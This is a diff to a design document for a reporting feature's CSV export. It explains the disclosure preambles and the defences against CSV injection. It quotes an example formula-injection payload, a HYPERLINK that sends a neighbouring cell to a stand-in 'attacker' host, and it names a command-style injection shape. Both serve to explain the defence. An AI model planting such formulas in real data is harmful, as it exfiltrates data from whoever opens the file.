@@ -2,7 +2,7 @@
 
 **Status: REVIEWED AND APPROVED 2026-09-19. All nine product decisions are made —
 see §6, which now records the ANSWERS, not the questions. Phases 0 and 1 are
-BUILT, and so are Phases 2 through 6.**
+BUILT, and so are Phases 2 through 7.**
 
 ### Two things Phase 1 discovered that changed the design
 
@@ -31,9 +31,46 @@ BUILT, and so are Phases 2 through 6.**
 | **4** | `CustomReportBuilder` wired | **built** (a rewrite — see below) |
 | **5** | `ReportDetailView` | **built** (routed by id; + the saved-reports list) |
 | **6** | Canned reports, incl. Revenue by Industry and by-owner with disclosure | **built** |
-| **7** | Exports (CSV, then PDF/Excel) | next |
-| **8** | Scheduling | |
+| **7** | Exports (CSV, then PDF/Excel) | **CSV built**; PDF/Excel still open |
+| **8** | Scheduling | next — needs a job runner that does not exist |
 | **9** | Caching with result age (small, droppable) | |
+
+### Phase 7 — CSV export, and the two things it had to get right
+
+**The disclosure is IN the file.** ReportsPage carried the rationale for the
+whole time export was disabled, and it was the design brief: *"writing those
+into a file the user keeps is worse than showing them on screen: on screen they
+are surrounded by context, in a spreadsheet they become someone's evidence."* A
+CSV of 15 seeded rows mailed to a manager is indistinguishable from a CSV of 15
+real ones, so the preamble carries the same sentence the screen shows, above the
+data, plus the figures behind it, the coverage lines, the currency note and a
+dedicated `TRUNCATED` row.
+
+The cost is that the file is not a bare data rectangle — a naive parser reads the
+preamble as rows. **That is a deliberate trade and is the one thing in this phase
+worth a second opinion**: a file that is slightly awkward to machine-parse is a
+much smaller problem than one that misrepresents what it contains.
+
+**CSV INJECTION IS A REAL PATH HERE, not a theoretical one.** Dimension values
+are user-supplied — deal names, company names, sources — and a cell beginning
+`=`, `+`, `-`, `@` or a tab is executed by Excel and Sheets.
+`=HYPERLINK("http://attacker/?x="&A1,"Q3 numbers")` in a deal name becomes a
+link that exfiltrates the neighbouring cell when clicked, and the victim is
+whoever opens the file, who need not be in the workspace at all. Cells are
+neutralised with a leading apostrophe on top of RFC 4180 quoting.
+
+**Negative numbers are exempted on purpose.** `-500` starts with a dangerous
+character and is also the likeliest legitimate value in a revenue report;
+prefixing it makes the cell text and silently breaks every SUM the recipient
+writes — a correctness bug introduced by a security fix. A value parsing as a
+finite number is left alone; the actual attack shape (`-1+1+cmd|...`) is NaN and
+is still caught.
+
+Both export routes resolve the report through ONE helper that applies
+`canViewPredicate`, so an export can never be a way to read a report you cannot
+open. Downloads reuse `config/fileStorage.streamHeaders` rather than a second
+hand-rolled pair, so they inherit `nosniff`, the `default-src 'none'; sandbox`
+CSP and RFC 6266 filename encoding.
 
 ### What Phase 6 found by running the disclosure at volume
 
